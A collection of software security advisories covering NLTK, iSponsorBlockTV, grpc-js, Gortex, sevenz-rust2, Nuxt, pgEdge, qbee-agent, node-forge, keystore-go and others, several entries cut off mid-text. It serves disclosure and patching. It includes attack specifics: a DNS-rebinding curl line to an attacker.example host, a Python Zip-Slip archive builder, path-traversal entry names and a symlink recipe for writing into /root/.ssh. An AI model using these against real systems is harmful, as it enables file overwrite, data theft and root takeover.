advisories.summary: NLTK corpus-reader view methods bypass the scoped root sandbox via intermediate-directory symlinks

> **affected**: PyPI `nltk` `>= 3.9.4` — `CorpusReader.abspaths()`/`abspath()` and the `PlaintextCorpusReader` / `SyntaxCorpusReader` view methods
> **dynamically reproduced**: `nltk` `3.9.4` (8/9, scoped-escape checks), `3.10.3` (wheel, 9/9 checks) and `master` `6818767b9` (9/9 checks)

---

_Source references (`file:line`) are to commit `303f6e2b` (release tag `v3.10.3`). Line numbers in the released `nltk` wheel match this tag exactly; `master` `6818767b9` contains the same code (pathsec.py renumbered by +44 lines from added hardening comments). In `3.9.4` the same logic exists at earlier line numbers (`api.py:222-236` for `open()`, `api.py:161-203` for `abspath()`/`abspaths()`, `data.py:382-388` for the pointer open, `pathsec.py:105-114` for the scoped branch); the affected code is identical._

### Summary

`CorpusReader.open()` (`nltk/corpus/reader/api.py:235-257`) is NLTK's hardened file-access entry point: after a lexical guard it calls `validate_path(..., required_root=self._root)` (`api.py:246-249`), and the scoped branch of `pathsec.validate_path` (`nltk/pathsec.py:168-179`) resolves symlinks and raises `ValueError` when the resolved target is not inside the corpus root. advisories.summary: iSponsorBlockTV: SSRF via Malicious SSDP Response Spoofing in Local Device Discovery
advisories.description:
### Summary
iSponsorBlockTV discovers local smart TV devices via SSDP (Simple Service Discovery Protocol). The `LOCATION` URL from SSDP responses is used to fetch device capabilities without URL validation. A local network attacker can craft a malicious SSDP response with a `LOCATION` pointing to any internal HTTP service, causing SSRF when the application fetches device information.

### Details
In `src/iSponsorBlockTV/dial_client.py:92-96`, upon receiving an SSDP M-SEARCH response, the code extracts the `LOCATION` header and makes an HTTP GET request to that URL to retrieve DIAL device description XML. The URL is not validated against expected device IP ranges, expected schemes, or private/internal IP blocklists. Any device on the LAN (or a rogue WiFi access point) can respond to SSDP M-SEARCH queries with a `LOCATION` pointing to internal services.

### Impact
Blind SSRF against internal network services; access to home router admin interfaces, smart home controllers, NAS admin pages, and other local services; potential credential disclosure from fetched responses.
It'd be able to either:
- show a debug log  line `- __main__ - DEBUG - Discovered device at <attacker controlled URL>, processing...` (which is normally disabled and won't be shown in the actual configurator since textual doesn't show logs unless running in dev mode and launching a second terminal to inspect log output), and make a single GET request to an "attacker controlled" url which does not leak any information back to iSponsorBlockTV itself and swallows any sort of error (parsing or an invalid response from not being a real DIAL server) (`dial_client.py` L131-L133) 
- make single POST request to a partly "attacker controlled" url since it'll always have the suffix `/YouTube` appended (`dial_client.py` L139) , with predefined headers `{"Origin": "https://www.youtube.com","Content-Type": "application/x-www-form-urlencoded",}` (`dial_client.py` L158-L161) and a predefined payload `{"pairingCode": <random 12 digit code>, "theme": "cl"}` which also does not leak any information back to iSponsorBlockTV itself and swallows any sort of error (parsing or an invalid response from not being a real DIAL server with a YouTube app running on it) (`dial_client.py` L162)

### Fix
Validate SSDP `LOCATION` URLs: allow only `http{s}://` scheme, extract the IP address, and verify it matches the SSDP sender's IP address. Reject `LOCATION` values pointing to private IP ranges other than the expected device

advisories.summary: @grpc/grpc-js: safe_regex incorrectly applies partial string matching for patterns with alternation
advisories.description:
### Summary

The StringMatcher/PathMatcher for `safe_regex` builds its RE2 as `^${regex}$` with no surrounding group. Because alternation has the lowest precedence, a pattern `"a|b|c"` compiles to `/^a|b|c$/` -- "starts with a" OR "contains b" OR "ends with c" instead of a full match of the whole value. Configurations with `safe_regex` matchers that use a regex alternation (a natural way to list methods or service identities) therefore apply partial string matches. This impacts route selection, xDS credentials, and RBAC.

### Details

`src/matcher.ts`: `SafeRegexValueMatcher` and `PathSafeRegexValueMatcher` both do
```ts
this.targetRegexImpl = new RE2(`^${targetRegex}$`, 'u');
```

and `apply()` returns `targetRegexImpl.test(value)`. With a top-level alternation the anchors bind only to the first/last branch.

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L59

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L232

`src/route.ts` (`getPredicateForStringMatcher` / `getPredicateForHeaderMatcher`) builds these for every `safe_regex` `StringMatcher`/`HeaderMatcher`, and src/rbac.ts uses them for RBAC `url_path` `permissions`/`principals`, `authenticated.principal_name` (mTLS SAN/CN), `requested_server_name` and `header rules`. So an ALLOW rule written with an alternation grants access to method names, certificate identities or header values that extend an intended one. DENY policies only become broader (fail-safe).

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L28

advisories.summary: Gortex: Arbitrary file write / repo-confinement escape in `write_file` / `edit_file` / `move_inline` MCP tools → code execution
advisories.description:
### Summary
Gortex is an MCP server exposing `write_file`, `edit_file`, and `move_inline` tools. `resolveFilePath` **exempts absolute paths** from confinement, and the write handlers — unlike `read_file` / `get_symbol_source` — **never call `guardSymlinkWithinRepo`**. A single MCP `write_file` call with an absolute path writes any file the daemon user can, **outside every indexed repo root** (`AtomicWriteFile`'s `MkdirAll` auto-creates missing parents). `internal/mcp/tools_fileops.go` (+ `tools_move_inline.go`), HEAD `28fa017` (v0.53.0).

`internal/mcp/tools_fileops.go:54-62` `resolveFilePath` exempts absolute paths from the repo-root confinement; the write sink at `:793` (`AtomicWriteFile`, `write_file`) and `:676` (`edit_file`) run with **no** `guardSymlinkWithinRepo`. The asymmetry is the bug: `read_file` (`:940`) and `get_symbol_source` **do** call `guardSymlinkWithinRepo`; the write path does not.

### PoC (executed)
The PoC (`internal/mcp/poc_arbitrary_write_test.go`, package `mcp`) builds the server via the repo's **own** `newSingleRepoServer(t)` harness and invokes the real `srv.handleWriteFile` through the genuine `mcplib.CallToolRequest` shape:

advisories.summary: Kubeflow Pipelines: Cross-tenant execution-cache poisoning / output substitution via a namespace-blind cache key in the cache webhook (multi-user)
advisories.description:
## Summary

The legacy Kubeflow Pipelines V1/raw-Argo execution cache does not separate cached results by Kubernetes namespace. In multi-user deployments where tenants share the cache service, a tenant can receive another tenant's cached outputs or seed outputs that are subsequently substituted into another tenant's step.

This affects the Argo-template cache mutating webhook and its cache-server storage path. Standard KFP V2 component pods bypass this webhook cache; the separate V2 cache implementation is outside this advisory's scope.

## Affected deployments and impact

The issue requires multiple tenant namespaces sharing the legacy cache service, cache-enabled V1/raw-Argo steps, and cache entries that satisfy the configured staleness policy. The standard multi-user configuration watches pods across namespaces.

A tenant able to submit a step with the same cache-relevant template fields as another tenant's step can:

- Read cached step outputs originally produced in another namespace.
- Populate the shared cache before another tenant's matching step runs, causing that step to report the cached outputs instead of executing its intended containers.

Matching refers to the selected template fields used by the cache key, not merely an identical container image. This is an application-level cache-key collision caused by missing tenant scope, not a cryptographic SHA-256 collision. The finding establishes cross-namespace confidentiality and integrity impact; it does not establish arbitrary code execution.

## CVSS rationale

**Medium — CVSS 3.1: 5.4**

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`

- **AV:N / PR:L / UI:N:** a tenant with ordinary workload-submission privileges can exercise the shared cache through network-accessible APIs. Reading an existing cached result or poisoning a subsequent automated execution requires no additional victim interaction.
- **AC:L:** known or shared templates can produce the same cache key deterministically. Cache-enabled execution and matching template fields describe the affected configuration; they do not establish an unavoidable narrow race or secret prerequisite.
- **S:U:** the established impact is disclosure or substitution of output data managed by the same cache service. Crossing tenant namespaces alone does not establish a change in security authority; execution under a separate victim authority has not been established here.
- **C:L / I:L / A:N:** the confirmed impact is selective cached-output disclosure and

advisories.summary: sevenz-rust2: decompress builds each output path as dest.join(entry.name()) with no traversal guard, allowing a crafted .7z to write files outside the destination (Zip-Slip)
advisories.description:
### Summary

Extracting an attacker-supplied 7z archive can write files outside the destination directory. The 7z header stores each entry's path as a UTF-16 name with nothing constraining it to a relative, in-tree path. The extractor joins that name onto the destination and writes to the result without normalizing it or checking that it stays under the destination root, so an entry named `../../etc/cron.d/x` or an absolute path escapes the target.

### Details

In `src/util/decompress.rs`, `decompress_impl` computes the per-entry destination directly (line 140):

```rust
let dest_path = dest.join(entry.name());
extract_fn(entry, reader, &dest_path)
```

`default_entry_extract_fn` (line 154) then acts on that path:

```rust
let file = File::create(path)
    .map_err(|e| Error::file_open(e, path.to_string_lossy().to_string()))?;
```

There is no normalization, no `dest_path.starts_with(dest)` check, and no symlink-entry handling. `Path::join` discards the base when the joined component is absolute, and `..` components are not collapsed against the base. The convenience entry points (`decompress`, `decompress_file`, `decompress_with_password`, `decompress_file_with_password`) all route through `decompress_impl` with `default_entry_extract_fn`, so the default API is affected.

The trust boundary is the archive bytes. Any caller that extracts an untrusted `.7z` reaches the sink.

1. Build a `.7z` whose `FilesInfo` contains an entry named `../../../../tmp/pwned` (or, on Windows, an absolute path such as `C:\Windows\Temp\pwned`).

3. The file is created at the traversed location outside `./out`. Targeting a startup/cron path or a config file turns the write into code execution or persistence.

### Impact

Arbitrary file write outside the intended directory (CWE-22 / CWE-23, the Zip-Slip class). On extraction of an attacker-controlled archive, an entry overwrites files outside the destination — config, cron, autostart, or build artifacts — which can escalate to code execution. Reachable by upload-handling backends, malware-analysis sandboxes, mod/game installers, and CI steps that unpack user-supplied 7z files.

Reject any entry whose name contains a `ParentDir`, `RootDir`, or `Prefix` component, or canonicalize the joined path and verify `starts_with(dest)` before creating it. Apply the guard inside `default_entry_extract_fn` (and `decompress_impl`) so the hardening i

advisories.summary: @nuxt/webpack-builder and @nuxt/rspack-builder dev server serves built source to DNS rebinding pages
advisories.description:
### Summary

When using the webpack or rspack builder, the dev server serves built client chunks to any request whose `Host` header matches its `Origin`/`Referer`, or that carries `Sec-Fetch-Site: same-origin`. After a DNS rebinding attack both headers name the attacker's hostname, so a malicious page opened while `nuxt dev` is running can read `/_nuxt/*.js` and exfiltrate the app's source. This bypasses the same-origin check added for [GHSA-4gf7-ff8x-hq99](https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99), [GHSA-6m52-m754-pw2g](https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g) and [GHSA-x6qj-4h56-5rj5](https://github.com/nuxt/nuxt/security/advisories/GHSA-x6qj-4h56-5rj5).

### Impact

A developer runs `nuxt dev` with `builder: 'webpack'` or `builder: 'rspack'` (the default config is enough; `--host` is not required) and opens a page on an attacker-controlled hostname, for example `http://rebind.attacker.example:3000/`. The attacker then re-points that hostname at `127.0.0.1`. Requests from the page now reach the dev server as same-origin requests:

```bash
curl -H 'Host: rebind.attacker.example:3000' -H 'Sec-Fetch-Site: same-origin' http://127.0.0.1:3000/_nuxt/app.js
# 200, with the compiled modules
```

The page can read the response with `fetch`, which exposes the compiled source and its inline source maps, module identifiers, the developer's local filesystem paths, and any developer-controlled values inlined into the client bundle (for example through a custom `DefinePlugin`). With rspack, the HMR websocket also accepts connections from the rebound hostname. Private `runtimeConfig` is not part of the client bundle.

The attacker needs to know or guess the dev server port and to time the DNS change. Chrome 142+ and other Chromium-based browsers that enforce [Local Network Access restrictions](https://developer.chrome.com/release-notes/142#local_network_access_restrictions) prompt before a public page can reach a loopback address.

The default Vite builder is not affected: Vite rejects unknown `Host` headers through `server.allowedHosts`. Production builds are not affected.

### Patches

Fixed in `@nuxt/webpack-builder` 4.6.4 and `@nuxt/rspack-builder` 4.6.4. The dev middleware now rejects requests whose `Host` header is not `localhost`, `*.localhost`, an IP address, or a hostname allowed by the new `devServer.allowedHosts` option or by `vite.server.allowedHosts`, before any `Sec-Fetch-Site`/`Origin`/`Referer` chec

advisories.summary: Active Storage: Unsigned Content-Type in GCS direct uploads with cache_control
advisories.description:
### Impact
When a GCS service is configured with the `cache_control` option, `ActiveStorage::Service::GCSService#url_for_direct_upload` signs direct-upload URLs with V4, and the V4 signature covers only the `Cache-Control` and `Host` headers. A direct-upload client can therefore send a `Content-Type` of its choosing, and can omit the declared `Content-MD5`, without invalidating the URL. GCS stores the supplied content type as object metadata, which takes precedence over the `response-content-type` that Active Storage sets on download URLs, so an uploaded object could be served as inline HTML under the application's bucket path on `storage.googleapis.com`. Script in such an object runs on the storage origin rather than the application's, but could register a Service Worker scoped to the bucket path and read or replace a victim's later responses for signed URLs in that bucket.

Applications that use the GCS service with `cache_control` configured and accept direct uploads are affected. GCS services without `cache_control` sign with V2 and are not affected.

### Details
The fixed releases sign every GCS direct-upload URL with V2, which binds an empty `Content-Type` and the declared `Content-MD5`. The configured `Cache-Control` is still returned by `headers_for_direct_upload` and sent by the client, but it is no longer part of the signature, and direct-upload URLs for these services are no longer limited to V4's seven-day maximum expiry. See the Active Storage CHANGELOG.

### Workarounds
Removing the `cache_control` option from the GCS service configuration makes Active Storage sign direct uploads with V2.

### Releases
The fixed releases are available at the normal locations.

Patches for those who cannot upgrade at once:
- 8.1: https://github.com/rails/rails/commit/8d93f6a872e9550a91bf0e4fce50083a235ef3b1.patch
- 8.0: https://github.com/rails/rails/commit/ddc08ba61a8001e7402864c62e466cf732fc7614.patch

### Credit
This issue was responsibly reported by HackerOne researcher [thepo1es](https://hackerone.com/thepo1es).

advisories.summary: Forge: Incomplete PKCS#7 padding validation in AES/DES CBC and ECB decryption
advisories.description:
### Summary
`decipher.finish()` in CBC and ECB mode accepted malformed PKCS#7 padding: only the last byte was checked, against a limit of four blocks, so mismatched padding bytes, a zero count and oversized counts were accepted and up to four blocks of plaintext could be silently removed. Fixed in node-forge 1.4.1.

### Details
`modes.cbc.prototype.unpad()` and `modes.ecb.prototype.unpad()` in `lib/cipherModes.js` read the last decrypted byte as the PKCS#7 padding count, rejected it only if it was larger than `blockSize << 2` (64 for AES, 32 for DES), and then removed that many bytes. They did not reject a count of 0 or a count larger than one block, and did not check that every padding byte equals the count, as PKCS#7 (RFC 5652 section 6.3) requires. On the Wycheproof AES-CBC-PKCS5 test vectors, 69 of 144 invalid vectors decrypted successfully.

CBC and ECB without a MAC do not provide integrity: an attacker who can modify ciphertext can already make the final block decrypt to any padding. The effect of this bug is that malformed ciphertext is accepted as valid and that oversized counts silently truncate up to four blocks of plaintext. The fix does not protect against padding oracle attacks; applications that decrypt untrusted CBC data need to authenticate it (for example with an HMAC) or use AES-GCM.

The fix requires a count from 1 to the block size and checks every padding byte. Data with other padding schemes that only use the last byte as the count (ANSI X.923, ISO 10126, XML Encryption) now fails to decrypt with default unpadding; set `decipher.mode.unpad = false` before `finish()` and remove such padding in application code.

#### Patches
Fixed in node-forge 1.4.1. CBC and ECB decryption requires valid PKCS#7 padding.

#### Workarounds
Authenticate CBC/ECB ciphertext before decrypting it, or use AES-GCM. To check padding on 1.4.0, set `decipher.mode.unpad = false` and validate the padding in application code.

#### References
- https://www.rfc-editor.org/rfc/rfc5652#section-6.3 (PKCS#7 content-encryption padding)
- https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/aes_cbc_pkcs5_test.json
- https://cwe.mitre.org/data/definitions/354.html (CWE-354: Improper Validation of Integrity Check Value)

#### Severity
CVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N (3.7, Low)
CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (6.3)
CVSS 4.0 rates this Moderate because its integrity weighting is higher;

packages.note: Forge: Incomplete PKCS#7 padding validation in AES/DES CBC and ECB decryption

advisories.summary: Gradle Shadow: Zip Slip path traversal in ShadowCopyAction — no independent entry-name sanitization
advisories.description:
### Summary
ShadowCopyAction in the Shadow plugin does not validate or sanitize ZIP entry names before writing them to the output fat JAR. A malicious upstream dependency containing path traversal sequences (e.g. `../../../../tmp/pwned.txt`) in entry names will have those entries reproduced verbatim in the output shadow JAR.

### Details
The vulnerability exists because Shadow relies entirely on Gradle's ZipFileTree for entry sanitization rather than implementing its own path validation. This means:

1. Users on Gradle < 7.6.2 / 8.x < 8.2.0 are directly exploitable
2. The produced shadow JAR becomes a Zip Slip weapon against any 
downstream consumer using unprotected extraction (raw ZipInputStream, 
older CI tooling, custom Java unpackers)
3. If Shadow ever uses a non-ZipFileTree code path, protection 
disappears silently

Affected file: `src/main/kotlin/com/github/jengelman/gradle/plugins/shadow/internal/ShadowCopyAction.kt`

### PoC
1. Create a malicious JAR with path traversal entry:
```python
import zipfile
with zipfile.ZipFile('evil.jar', 'w') as zf:
    zf.writestr('../../../../tmp/zipslip_proof.txt', 'pwned')
```
2. Add as dependency in a shadow project
3. Run `gradle shadowJar`
4. Run `unzip -l build/libs/*.jar | grep "\.\."`
5. Traversal entry survives in output JAR

### Impact
Any tool extracting the shadow JAR with unprotected extraction is subject to arbitrary file overwrite. Users on older Gradle versions  are directly vulnerable at build time.

advisories.summary: envd: Host file disclosure through requirements path traversal and TOCTOU
advisories.description:
### Summary

envd’s `install.python_packages(requirements=...)` could read files outside the build context on the host. Content interpreted as dependency entries could appear in build logs and build-step metadata.

Commit f576c92, released in v1.3.5, added path containment validation but left a time-of-check/time-of-use (TOCTOU) race between symlink resolution and opening the requirements file. Commit 9d575b3 addresses this race by opening requirements files through a directory-rooted filesystem handle.

### Details

envd reads requirements files on the host to determine whether their contents can be embedded directly into a pip installation build step.

The vulnerable host-side requirements read was introduced in v0.3.38. Version v1.3.5 added containment checks for static path escapes but remained vulnerable to a TOCTOU race. The complete fix is included in v1.3.6.

Before f576c92, this host read lacked a build-context containment check. That commit added frontend path validation and a compile-time check using filepath.EvalSymlinks followed by a containment comparison.

However, symlink resolution returns a pathname rather than a pinned filesystem object. The subsequent os.Open independently resolves that pathname. Concurrent filesystem changes could therefore invalidate the containment check before the file was opened.

The complete fix uses os.OpenRoot and Root.Open to enforce containment during filesystem traversal.

Resources:
- first commit: be783264fdd79ad7262cea0485b7d449ca514f80
- Initial containment fix: f576c92
- TOCTOU fix: 9d575b3

### Proof of concept

The security-relevant condition is a requirements-file pathname whose filesystem resolution changes between validation and opening. The containment check describes the filesystem at validation time, while the later pathname-based open may access a different object.

The fix includes a deterministic regression test for the underlying object-pinning guarantee. It opens a context directory handle, moves that directory, and creates a replacement directory at the original pathname containing different requirements. The rooted reader continues reading the original context; a pathname-based reader reads the replacement.

This regression test demonstrates the distinction between rooted and pathname-based reads. It is not an end-to-end demonstration of host file disclosure.

advisories.summary: pgEdge Control Plane generates pg_hba.conf with trust authentication for local and loopback connections
advisories.description:
### Summary

Every `pg_hba.conf` generated by the pgEdge Control Plane begins with a hard-coded block of `trust` entries covering Unix-socket and loopback connections. Any operating-system account that can reach the Postgres socket or the loopback interface on a database host can authenticate as any Postgres role, including the superuser, without presenting a credential.

### Details

The generated file opens with the following six entries:

```
local   all         all                     trust
host    all         all     127.0.0.1/32    trust
host    all         all     ::1/128         trust
local   replication all                     trust
host    replication all     127.0.0.1/32    trust
host    replication all     ::1/128         trust
```

Postgres evaluates `pg_hba.conf` top-down and stops at the first matching rule. Because these entries are emitted at the top of the file, they also pre-empt every rule below them — including entries supplied by an operator through the `pg_hba_conf` field of a database node specification, which are appended lower in the file and are therefore never reached for local or loopback connections.

Both supported orchestrators emit these entries, but exposure differs by deployment model:

* **systemd** — the database runs on a shared multi-user host. Any local account
  on that host can connect as the Postgres superuser. This is the
  higher-severity case and the one the CVSS score below reflects.
* **Docker Swarm** — the Unix socket and the loopback interface belong to the
  Postgres container, so reaching these entries requires code execution inside
  that container. Publishing the Postgres port to the host does not change this:
  such connections are not seen by Postgres as originating from `127.0.0.1` or
  `::1`, so they do not match the entries above. The practical exposure is
  correspondingly narrower.

An operator who verifies their own deployment can confirm the issue by inspecting the generated `pg_hba.conf` on a database node for the entries above.

### Impact

An unprivileged local operating-system account on an affected database host obtains full control of every Postgres database on that host: read of all data, modification or destruction of all data, and any action available to a Postgres superuser. Under the systemd orchestrator this converts any local account into a database superuser with no additional prerequisites.

### Affected versions

pgEdge Control Plane v0.1.0 through v0.10.1, inclusive.

advisories.summary: Cocos AI Intra-handshake attested TLS implementation is vulnerable to TOCTOU Attacks
advisories.description:
### Summary
An attacker who can modify the attested workload’s code, memory-backed state, or configuration after the initial attestation — but without necessarily terminating the existing TLS connection — can cause the peer to continue trusting the connection as if the originally attested state were still running.

### Details
Once attestation is successfully appraised and connection is established, there is a window of vulnerability from the establishment of connection to the termination of connection where an attacker can modify the state of the workload and platform at runtime on the TLS endpoint acting as the Attester. Workload state includes code, data, and configuration. Other examples of state changes at the workload level include cases where a new device (such as a GPU) is connected, or where a connected device is disconnected, since the connection establishment.

In Cocos AI, there is no mechanism for the peer to know that some state has changed in the Attester after the connection establishment. The vulnerability is particularly concerning for long-lived connections.

In short, this vulnerability was possible because Cocos AI performs attestation only once in the lifetime of the connection (at connection establishment time) and the verifying peer continues to believe that the state is the same as in initial Evidence throughout, whereas it could be stale at some point in time.

This vulnerability for Cocos AI was found and demonstrated by Muhammad Usama Sardar via formal analysis. Formal analysis was performed in the state-of-the-art tool, ProVerif.

### Workarounds
The proposed workaround is to allow re-attestation of the workload after periodic or user-defined intervals using post-handshake attestation.

### Background and General Technical Details
For background and general (not specific to Cocos AI) technical details on this vulnerability, please see `G-RA2: Freshness of Evidence` in Sec. 5.1.1 of [Identity Crisis in Confidential Computing: Formal Analysis of Attested TLS](https://doi.org/10.1145/3779208.3785387). Also, see the corresponding [formal analysis](https://github.com/CCC-Attestation/formal-spec-id-crisis).

### Credits
This vulnerability for Cocos AI was found and _responsibly_ disclosed by Muhammad Usama Sardar (TU Dresden, Germany).

advisories.summary: DOMShell: domshell_eval classified as read-tier can execute side-effecting JavaScript without --allow-write
advisories.description:
### Summary

The `domshell_eval` MCP tool (and the `eval` command inside `domshell_execute`) was classified as **read-tier**, allowing it to run without the `--allow-write` server flag. However, `eval` and the write-tier `js` command dispatch to the same handler in the extension and call CDP `Runtime.evaluate` with the raw expression string and no side-effect gate. Any JavaScript expression could therefore mutate DOM, window, or global state through `domshell_eval` without the operator's `--allow-write` authorization.

The tool description explicitly promised "(read-only) ... always available in read-only mode" — the misclassification contradicted the documented contract, not just an implicit one.

### Impact

No new capability was exposed — the same write access was already available via `domshell_js` with `--allow-write` — but the tier misclassification meant:

- MCP hosts (Claude Desktop, Cursor, etc.) rendered the wrong approval UI (`readOnlyHint: true`)
- Server-side tier flags (`--allow-write`) misrepresented what an AI agent was actually authorized to do
- Audit logs and deny messages labeled write-tier activity as read-tier
- Downstream tools and analysis relying on the tier separation could over-trust an `eval` call

Framing: OWASP LLM Top 10 LLM06 (Excessive Agency), NIST AI RMF (tool permission boundary + human-approval fidelity), CWE-863 (Incorrect Authorization).

The reporter's main framing: **the MCP approval UI and server-side permission model can misrepresent the actual agency being granted to an AI agent.**

### Affected code paths

- `mcp-server/index.ts:113` — `WRITE_COMMANDS` excluded `eval`
- `mcp-server/index.ts:879-887` — `domshell_eval` registered with `ANNO_READ` and description asserting read-only
- `src/background/index.ts:1849-1854` — `js` and `eval` both dispatch to `handleJs(rawCode)`
- `src/background/index.ts:3282` — `handleJs` calls `cdp.evaluateJs(code)`
- `src/background/cdp_client.ts:660-667` — `evaluateJs` sends `Runtime.evaluate` with `expression: code, returnByValue: true, awaitPromise: true` and no `throwOnSideEffect` gate

### Fix

Shipped in `@apireno/domshell@2.0.8` (2026-07-08):

- `eval` added to `WRITE_COMMANDS`, aligning tier with actual capability
- `domshell_eval` MCP annotation changed from `ANNO_READ` to `ANNO_WRITE`
- Tool description and `MCP_INSTRUCTIONS` updated to remove read-only language; read-only DOM inspection needs pointed at `domshell_cat` / `domshell_text` / `domshell_find`
- Server-only patc

advisories.summary: qbee-agent: Local Privilege Escalation and Arbitrary File Tampering via Symlink Following in createFile helper
advisories.description:
This is a Local Privilege Escalation (LPE) vulnerability stemming from improper symlink handling (CWE-59: Link Following) and improper ownership management (CWE-282) inside the qbee-agent file manager logic.

### Impact

Any managed device running qbee-agent up to the affected versions. The impact manifests in three distinct vectors:

1. **Primary Vector (Full Privilege Escalation to Root - Default Configuration)**: If an unprivileged user's account is managed by the SSH Keys bundle, they can replace or remove their own `~/.ssh` directory and create a symlink pointing to `/root/.ssh`. On the next configuration apply, qbee-agent follows the symlink and writes the user's server-provisioned public key directly into `/root/.ssh/authorized_keys`. Since the symlink resides inside the user's own home directory, kernel protections like `fs.protected_symlinks` do not block this execution. The attacker can then instantly log in as root via SSH.

2. **Secondary Vector (Arbitrary File Overwrite / DoS via RAUC Staging)**: On devices utilizing RAUC download mode, the agent uses a predictable, world-writable staging path (`/tmp/.bundle.raucb.part`). If `fs.protected_symlinks` is disabled `(0)`, an unprivileged user can symlink this path to a vital system file (e.g., `/etc/shadow` or `/etc/pam.d/*`), causing the agent to truncate or overwrite it with server-supplied update data during a RAUC update deployment.

3. **Tertiary Vector (Arbitrary File Re-ownership via File Distribution)**: If an operator configures a file-distribution/template destination under a directory owned by an unprivileged user, the attacker can create a symlink at the partial download path targeting a sensitive system file. The agent will then inadvertently execute `file.Chown()` on the targeted file, handing ownership over to the unprivileged attacker.

### Patches

The vulnerability has been addressed by hardening file creation and directory traversal inside `app/configuration/file_manager.go`. Specifically, the agent now enforces `syscall.O_NOFOLLOW` and proper existence validation flags during privileged operations to prevent link resolution outside intended directories.

Users should upgrade to version 2026.27 (or newer) to fully mitigate these vectors.

### Workarounds

If upgrading immediately is not feasible, administrators can apply the following mitigations:

advisories.summary: Forge: Certificate signature verified with the issuer's RSA signature scheme
advisories.description:
### Summary

When verifying a certificate, node-forge chose the RSA padding scheme (PKCS#1 v1.5 or RSASSA-PSS) and PSS parameters from the issuer certificate's own signature algorithm instead of the certificate being verified. A certificate labeled as signed with RSASSA-PSS could pass `verifyCertificateChain()` with a PKCS#1 v1.5 signature. Fixed in node-forge 1.4.1.

### Details

`certificate.verify(child)` in `lib/x509.js` hashes the child's TBSCertificate with the digest of the child's signature algorithm, then calls `_verifySignature()` with the issuer certificate. `_verifySignature()` selected the padding scheme from that certificate's `signatureOid` and `signatureParameters`, so the child was verified with the issuer's own scheme rather than the one the child declares.

As a result, a child certificate whose signature algorithm says RSASSA-PSS was accepted with a PKCS#1 v1.5 signature when the issuer itself was signed with PKCS#1 v1.5. The outer `signatureAlgorithm` field of a certificate is not covered by the signature, so an existing PKCS#1 v1.5 (SHA-256) certificate can be relabeled as RSASSA-PSS and still pass verification. The signature itself must still be made with the issuer's private key over the certificate's contents; no certificate can be forged.

The same cause made correctly signed chains fail: a PKCS#1 v1.5 certificate issued by an RSASSA-PSS-signed certificate, or the reverse, was rejected.

The fix verifies with the child certificate's signature scheme and parameters and the issuer's public key.

### Patches
Fixed in node-forge 1.4.1. Certificate signatures are verified with the scheme of the certificate's own signature algorithm.

### Workarounds
Applications that make decisions based on a certificate's signature algorithm can verify the signature themselves with that algorithm's scheme and the issuer's public key.

### References
- https://www.rfc-editor.org/rfc/rfc4055#section-3 (RSASSA-PSS signature algorithm in certificates)
- https://www.rfc-editor.org/rfc/rfc5280#section-4.1.1.2 (Certificate signatureAlgorithm)
- https://cwe.mitre.org/data/definitions/347.html (CWE-347: Improper Verification of Cryptographic Signature)

### Severity
CVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N (3.7, Low)
CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (6.3)
CVSS 4.0 rates this Moderate because its integrity weighting is higher; the severity rating follows CVSS 3.1.

Reported by Br

advisories.summary: split: TOCTOU output-open allows truncating a swapped file
advisories.description:
`split` checks input/output identity by path before opening the output, then opens with truncation, leaving a race window on mutable path components. GNU opens first and compares the opened output inode against the input before truncating. The race can cause `split` to truncate/write a file different from the one validated — including the input file or another file the process can access.

**Fixed in 0.10.0** (PR #12565, commit 58040feb5c66fce588a7ffac299b3a23bd55cd81): the output open path is hardened against TOCTOU target swaps.

---

advisories.summary: keystore-go: Keystore integrity and password verification bypass via stripped trailing digest in Decode()
advisories.description:
### Summary
`keystore.Decode()` fails to check the error returned when reading the trailing SHA-1 integrity digest of a JKS keystore. If an attacker removes the final 20 bytes from a `.jks` file, the digest read returns an empty slice and the byte-comparison loop never executes, so `Decode()` returns the parsed keystore with `err == nil`. This defeats both tamper detection and — for certificate-only truststores — the password check itself, allowing an attacker with write access to a keystore file (but without knowledge of the keystore password) to silently inject or replace trusted CA certificates.

### Details
**Affected versions:** `github.com/pavel-v-chernykh/keystore-go` ≤ `v2.1.0+incompatible` (the final release on this module path).  v3 and v4 releases are not impacted.

In `decoder.go`, function `Decode`, lines 264-272:

```go
computedDigest := ksd.md.Sum(nil)
actualDigest, err := ksd.readBytes(uint32(ksd.md.Size()))
for i := 0; i < len(actualDigest); i++ {
    if actualDigest[i] != computedDigest[i] {
        return nil, ErrInvalidDigest
    }
}

return keyStore, nil
```

Two defects combine here:

1. The `err` returned by `ksd.readBytes(20)` on line 265 is assigned but never inspected.
2. The comparison loop on line 266 is bounded by `len(actualDigest)` rather than `len(computedDigest)`.

`readBytes` (`decoder.go` lines 75-94) reads the requested bytes via `io.ReadFull`; on EOF/short read it returns `(nil, ErrIo)`:

```go
_, err := io.ReadFull(ksd.r, ksd.b[:blockSize])
if err != nil {
    return result, ErrIo
}
```

When the trailing 20-byte digest is absent from the input stream, `actualDigest` is therefore `nil`, `len(actualDigest) == 0`, the `for` loop body never executes, and `Decode()` falls through to `return keyStore, nil`.

The JKS format's only integrity guarantee is this trailing `SHA1(passwordBytes || "Mighty Aphrodite" || body)` digest. For truststores containing only `TrustedCertificateEntry` values it is also the *only* place the password is verified. Consequently:

- An attacker who can modify a `.jks` truststore on disk — but does **not** know the keystore password — can replace or add trusted CA certificates, drop the last 20 bytes of the file, and the consuming Go process will load the forged truststore as valid.
